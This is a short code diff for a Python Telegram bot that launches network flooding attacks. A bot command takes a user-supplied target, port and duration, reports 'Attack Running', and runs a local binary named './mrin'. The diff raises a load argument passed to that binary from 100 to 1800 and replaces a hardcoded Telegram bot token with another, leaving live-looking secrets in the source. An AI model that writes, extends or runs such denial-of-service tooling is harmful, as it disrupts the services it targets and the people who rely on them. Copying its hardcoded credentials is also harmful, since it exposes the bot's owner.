@@ -16,7 +16,7 @@ import threading
 load_dotenv()
 
 # Configuration
-BOT_TOKENS = [os.getenv('BOT_TOKEN_1', '7275048595:AAEUmiY1AYw7bWyy2EvaETdpfTMdinhhpNg')]
+BOT_TOKENS = [os.getenv('BOT_TOKEN_1', '7275048595:AAG1tDVOTm2dngoD-KjTIoOmItZaO63sM7U')]
 ADMIN_IDS = ["6240348610", "6188354219", "1066744659", "8159441634", "1202212810",]
 WHITELISTED_IPS = ["127.0.0.1", "192.168.1.1"]
 UNAUTHORIZED_MESSAGE = "TUM ABHI APPROVED NAHI HO BRO"
@@ -321,7 +321,7 @@ def create_handlers(bot):
 
             response = f"Flooding parameters set: {target}:{port} for {duration}. Attack Running."
             bot.reply_to(message, response)
-            full_command = ["./mrin", target, str(port), str(duration), "100"]
+            full_command = ["./mrin", target, str(port), str(duration), "1800"]
             process = subprocess.Popen(full_command, shell=False)
             threading.Thread(target=monitor_attack, args=(process, bot, chat_id, target, port, duration), daemon=True).start()
 
